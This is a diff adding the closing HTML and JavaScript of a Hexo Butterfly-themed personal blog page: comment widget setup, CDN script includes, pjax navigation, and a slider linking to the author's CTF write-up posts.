+    twikoo.init(Object.assign({
+      el: '#twikoo-wrap',
+      envId: '',
+      region: '',
+      onCommentLoaded: function () {
+        btf.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
+      }
+    }, null))
+  }
+
+  const getCount = () => {
+    const countELement = document.getElementById('twikoo-count')
+    if(!countELement) return
+    twikoo.getCommentsCount({
+      envId: '',
+      region: '',
+      urls: [window.location.pathname],
+      includeReply: false
+    }).then(function (res) {
+      countELement.innerText = res[0].count
+    }).catch(function (err) {
+      console.error(err);
+    });
+  }
+
+  const runFn = () => {
+    init()
+    
+  }
+
+  const loadTwikoo = () => {
+    if (typeof twikoo === 'object') {
+      setTimeout(runFn,0)
+      return
+    } 
+    getScript('https://cdn.staticfile.org/twikoo/1.6.8/twikoo.all.min.js').then(runFn)
+  }
+
+  if ('Twikoo' === 'Twikoo' || !true) {
+    if (true) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
+    else loadTwikoo()
+  } else {
+    window.loadOtherComment = () => {
+      loadTwikoo()
+    }
+  }
+})()</script></div><script src="https://cdn.staticfile.org/jquery/3.6.3/jquery.min.js"></script><script async src="https://cdn1.tianli0.top/npm/vue@2.6.14/dist/vue.min.js"></script><script async src="https://cdn1.tianli0.top/npm/element-ui@2.15.6/lib/index.js"></script><script async src="https://cdn.bootcdn.net/ajax/libs/clipboard.js/2.0.11/clipboard.min.js"></script><script defer type="text/javascript" src="https://cdn1.tianli0.top/npm/sweetalert2@8.19.0/dist/sweetalert2.all.js"></script><script async src="//npm.elemecdn.com/pace-js@1.2.4/pace.min.js"></script><script defer src="https://cdn1.tianli0.top/gh/nextapps-de/winbox/dist/winbox.bundle.min.js"></script><script async src="//at.alicdn.com/t/c/font_3586335_hsivh70x0fm.js"></script><script async src="//at.alicdn.com/t/c/font_3636804_gr02jmjr3y9.js"></script><script async src="//at.alicdn.com/t/c/font_3612150_kfv55xn3u2g.js"></script><script async src="https://cdn.wpon.cn/2022-sucai/Gold-ingot.js"></script><canvas id="universe"></canvas><canvas id="snow"></canvas><script defer src="/js/fomal.js"></script><script id="click-heart" src="https://cdnjs.cloudflare.com/ajax/libs/butterfly-extsrc/1.1.3/click-heart.min.js" async="async" mobile="false"></script><link rel="stylesheet" href="https://lf6-cdn-tos.bytecdntp.com/cdn/expire-1-M/aplayer/1.10.1/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://lf6-cdn-tos.bytecdntp.com/cdn/expire-1-M/aplayer/1.10.1/APlayer.min.js"></script><script src="https://cdn1.tianli0.top/npm/js-heo@1.0.12/metingjs/Meting.min.js"></script><script src="https://lib.baomitu.com/pjax/0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show","#web_bg",".js-pjax","#bibi","body > title","#app","#tag-echarts","#posts-echart","#categories-echarts"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener scroll 
+  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
+  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)
+
+  typeof preloader === 'object' && preloader.initLoading()
+  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+  typeof disqusjs === 'object' && disqusjs.destroy()
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof chatBtnFn === 'function' && chatBtnFn()
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+
+  typeof preloader === 'object' && preloader.endLoading()
+})
+
+document.addEventListener('pjax:error', (e) => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><!-- hexo injector body_end start --><script data-pjax>
+  function butterfly_swiper_injector_config(){
+    var parent_div_git = document.getElementById('recent-posts');
+    var item_html = '<div class="recent-post-item" style="height: auto;width: 100%"><div class="blog-slider swiper-container-fade swiper-container-horizontal" id="swiper_container"><div class="blog-slider__wrp swiper-wrapper" style="transition-duration: 0ms;"><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;posts/LitCTF2024.html&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://tuchuang.voooe.cn/images/2024/06/05/efa4c9e15a.png" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2024-06-05</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;posts/LitCTF2024.html&quot;);" href="javascript:void(0);" alt="">LitCTF 2024</a><div class="blog-slider__text">web&amp;misc wp</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;posts/LitCTF2024.html&quot;);" href="javascript:void(0);" alt="">详情       </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;posts/ISCTF2023[3].html&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://tuchuang.voooe.cn/images/2024/03/19/7c125e71d6bd478aa288abe3ac25672e.png" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2024-03-07</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;posts/ISCTF2023[3].html&quot;);" href="javascript:void(0);" alt="">ISCTF 2023</a><div class="blog-slider__text">web&amp;misc wp</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;posts/ISCTF2023[3].html&quot;);" href="javascript:void(0);" alt="">详情       </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;posts/moeCTF2023[2].html&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://tuchuang.voooe.cn/images/2024/03/19/ea5a684083a94b068702a9eaf0694f87.webp" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2024-03-08</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;posts/moeCTF2023[2].html&quot;);" href="javascript:void(0);" alt="">moeCTF 2023</a><div class="blog-slider__text">web&amp;misc wp</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;posts/moeCTF2023[2].html&quot;);" href="javascript:void(0);" alt="">详情       </a></div></div></div><div class="blog-slider__pagination swiper-pagination-clickable swiper-pagination-bullets"></div></div></div>';
+    console.log('已挂载butterfly_swiper')
+    parent_div_git.insertAdjacentHTML("afterbegin",item_html)
+    }
+  var elist = 'undefined'.split(',');
+  var cpage = location.pathname;
+  var epage = '/';
+  var flag = 0;
+
+  for (var i=0;i<elist.length;i++){
+    if (cpage.includes(elist[i])){
+      flag++;
+    }
+  }
+
+  if ((epage ==='all')&&(flag == 0)){
+    butterfly_swiper_injector_config();
+  }
+  else if (epage === cpage){
+    butterfly_swiper_injector_config();
+  }
+  </script><script defer src="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper.min.js"></script><script defer data-pjax src="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper_init.js"></script><div class="js-pjax"><script async="async">var arr = document.getElementsByClassName('recent-post-item');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__zoomIn');
+    arr[i].setAttribute('data-wow-duration', '2s');
+    arr[i].setAttribute('data-wow-delay', '200ms');
+    arr[i].setAttribute('data-wow-offset', '30');
+    arr[i].setAttribute('data-wow-iteration', '1');
+  }</script><script async="async">var arr = document.getElementsByClassName('blog-slider swiper-container-fade swiper-container-horizontal');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__zoomIn');
+    arr[i].setAttribute('data-wow-duration', '1.5s');
+    arr[i].setAttribute('data-wow-delay', '200ms');
+    arr[i].setAttribute('data-wow-offset', '30');
+    arr[i].setAttribute('data-wow-iteration', '1');
+  }</script><script async="async">var arr = document.getElementsByClassName('card-widget');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__zoomIn');
+    arr[i].setAttribute('data-wow-duration', '2s');
+    arr[i].setAttribute('data-wow-delay', '200ms');
+    arr[i].setAttribute('data-wow-offset', '30');
+    arr[i].setAttribute('data-wow-iteration', '1');
+  }</script></div><script defer src="https://npm.elemecdn.com/hexo-butterfly-wowjs/lib/wow.min.js"></script><script defer src="https://npm.elemecdn.com/hexo-butterfly-wowjs/lib/wow_init.js"></script><script data-pjax src="https://npm.elemecdn.com/hexo-filter-gitcalendar/lib/gitcalendar.js"></script><script data-pjax>
+  function gitcalendar_injector_config(){
+      var parent_div_git = document.getElementById('gitZone');
+      var item_html = '<div class="recent-post-item" id="gitcalendarBar" style="width:100%;height:auto;padding:10px;"><style>#git_container{min-height: 320px}@media screen and (max-width:650px) {#git_container{min-height: 0px}}</style><div id="git_loading" style="width:10%;height:100%;margin:0 auto;display: block;"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 50 50" style="enable-background:new 0 0 50 50" xml:space="preserve"><path fill="#d0d0d0" d="M25.251,6.461c-10.318,0-18.683,8.365-18.683,18.683h4.068c0-8.071,6.543-14.615,14.615-14.615V6.461z" transform="rotate(275.098 25 25)"><animatetransform attributeType="xml" attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur="0.6s" repeatCount="indefinite"></animatetransform></path></svg><style>#git_container{display: none;}</style></div><div id="git_container"></div></div>';
+      parent_div_git.insertAdjacentHTML("afterbegin",item_html)
+      console.log('已挂载gitcalendar')
+      }
+
+    if( document.getElementById('gitZone') && (location.pathname ==='/site/census/'|| '/site/census/' ==='all')){
+        gitcalendar_injector_config()
+        GitCalendarInit("/api?null",['#d9e0df', '#c6e0dc', '#a8dcd4', '#9adcd2', '#89ded1', '#77e0d0', '#5fdecb', '#47dcc6', '#39dcc3', '#1fdabe', '#00dab9'],'null')
+    }
+  </script><!-- hexo injector body_end end --></body></html>
